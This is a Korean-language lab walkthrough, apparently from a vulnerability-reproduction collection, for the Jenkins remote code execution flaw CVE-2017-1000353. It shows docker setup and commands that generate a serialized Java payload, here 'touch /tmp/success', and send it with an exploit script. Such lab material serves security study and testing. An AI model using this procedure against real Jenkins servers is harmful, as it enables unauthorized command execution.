# Jenkins-CI 원격 코드 실행 취약성（CVE-2017-1000353）

## 원리

참고 사이트 https://blogs.securiteam.com/index.php/archives/3171

## 환경구축

다음 명령어를 입력jenkins 2.46.1：

```
docker compose up -d
```

부팅완료후 `http://your-ip:8080`로 접속하면 jenkins가 자동적으로 설치됨

## 테스트 과정

### 1단계 직렬화된 문자열 생성

참고<https://github.com/vulhub/CVE-2017-1000353>，poc생성 도구인 [CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，을 머저 다운로드

아래의 face명령을 실행하여 바이트 코드 파일을 생성： 

```bash
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
# jenkins_poc.ser은 생성된 바이트 코드 파일 이름
# "touch ..."은 실행할 명령
```

위의 코드를 실행하면 jenkins_poc가 생성됩니다.ser 파일은 직렬화된 문자열

### 2단계 패킷전송,명령실행

익스플로잇다운[exploit.py](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py)，python3실행`python exploit.py http://your-ip:8080 jenkins_poc.ser`，방금 생성한 바이트 코드 파일을 대상에게 전송함：

![](1.png)

도커에 들어가서`/tmp/success`가 생성되며 명령 실행 취약점을 성공적으로 이용했음을 나타냄

![](2.png)
